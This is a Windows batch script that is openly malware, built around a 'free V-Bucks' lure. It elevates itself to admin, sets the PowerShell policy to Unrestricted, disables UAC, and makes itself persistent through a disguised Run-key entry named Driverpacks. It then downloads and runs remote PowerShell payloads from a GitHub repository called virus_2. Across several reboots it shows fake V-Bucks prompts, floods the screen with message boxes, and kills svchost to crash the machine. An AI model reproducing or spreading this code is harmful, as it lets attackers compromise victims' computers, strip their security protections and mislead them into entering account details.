@echo off
setlocal ENABLEEXTENSIONS
set SEE_MASK_NOZONECHECKS=1

:: 1. ADMIN CHECK
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: 2. FORCE UNRESTRICTED POWERSHELL
reg add "HKLM\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" /v "ExecutionPolicy" /t REG_SZ /d "Unrestricted" /f >nul

:: 3. CONFIGURATION
set "TargetFolder=%USERPROFILE%\Driverpacks"
set "TargetFile=%TargetFolder%\Mouse.bat"
set "Key=HKCU\Software\Freevbucks"

:: 4. PERSISTENCE
if /i "%~f0" neq "%TargetFile%" (
    if not exist "%TargetFolder%" mkdir "%TargetFolder%"
    copy "%~f0" "%TargetFile%" /Y >nul
    powershell -ExecutionPolicy Bypass -Command "Unblock-File -Path '%TargetFile%'"
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Driverpacks" /t REG_SZ /d "\"%TargetFile%\"" /f >nul
    start "" "%TargetFile%"
    exit /b
)

:: 5. STAGE DETECTION
reg query "%Key%" /v "Stage" >nul 2>&1
if errorlevel 1 reg add "%Key%" /v "Stage" /t REG_DWORD /d 1 /f >nul

for /f "tokens=3" %%A in ('reg query "%Key%" /v "Stage" ^| findstr "Stage"') do set /a currentStage=%%A

:: ==========================================
:: STAGE 1: GDI MELT & REBOOT
:: ==========================================
if %currentStage%==1 (
    :: Download silently using hidden PowerShell instead of visible CURL
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielNov2014/virus_2/main/resources/gdi.ps1' -OutFile '%TargetFolder%\gdi.ps1'; Unblock-File -Path '%TargetFolder%\gdi.ps1'"
    
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >nul
    reg add "%Key%" /v "Stage" /t REG_DWORD /d 2 /f >nul
    
    :: Run GDI Hidden
    start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TargetFolder%\gdi.ps1"
    
    timeout /t 15 >nul
    shutdown /r /f /t 0
    exit /b
)

:: ==========================================
:: STAGE 2: AUDIO TROLL & CRASH
:: ==========================================
if %currentStage%==2 (
    :: Everything here is wrapped in one hidden PowerShell command
    :: This runs the Troll Audio, The Input Boxes, and then crashes the PC
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$mp3='https://github.com/DanielNov2014/virus_2/raw/refs/heads/main/resources/you-been-trolled.mp3'; $path='$env:TEMP\troll.mp3'; Invoke-WebRequest -Uri $mp3 -OutFile $path; Add-Type -AssemblyName System.Speech,Microsoft.VisualBasic,PresentationCore; $v=New-Object System.Speech.Synthesis.SpeechSynthesizer; $v.Speak('hello user you want vbucks right just type your username in the message box and then click enter'); [Microsoft.VisualBasic.Interaction]::InputBox('Username:','V-Bucks',''); $v.Speak('how much vbucks do you want?'); [Microsoft.VisualBasic.Interaction]::InputBox('Amount:','V-Bucks','13500'); $v.Speak('you been fooled'); $p=New-Object System.Windows.Media.MediaPlayer; $p.Open($path); $p.Volume=1; $p.Play(); Start-Sleep -s 15; for($i=0;$i -lt 25;$i++){ start-process powershell '-WindowStyle Hidden -ExecutionPolicy Bypass -Command [Reflection.Assembly]::LoadWithPartialName(\"System.Windows.Forms\"); [System.Windows.Forms.MessageBox]::Show(\"YOU BEEN TROLLED\", \"LOL\")' }; Start-Sleep -s 2; reg add 'HKCU\Software\Freevbucks' /v 'Stage' /t REG_DWORD /d 3 /f; stop-process -name svchost -force"
    exit /b
)

:: ==========================================
:: STAGE 3: BLENDER & REBOOT
:: ==========================================
if %currentStage%==3 (
    :: 1. Download & Unblock Blender Script (HIDDEN)
    powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielNov2014/virus_2/main/resources/blender.ps1' -OutFile '%TargetFolder%\blender.ps1'; Unblock-File -Path '%TargetFolder%\blender.ps1'"
    
    :: 2. Increment Stage to 4
    reg add "%Key%" /v "Stage" /t REG_DWORD /d 4 /f >nul
    
    :: 3. Run Blender Effect (HIDDEN WINDOW)
    start "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TargetFolder%\blender.ps1"
    
    :: 4. Wait 20 Seconds (Silent timeout)
    timeout /t 20 >nul
    
    :: 5. Reboot
    shutdown /r /f /t 0
    exit /b
)

:: ==========================================
:: STAGE 4: END
:: ==========================================
if %currentStage%==4 (
    exit
)
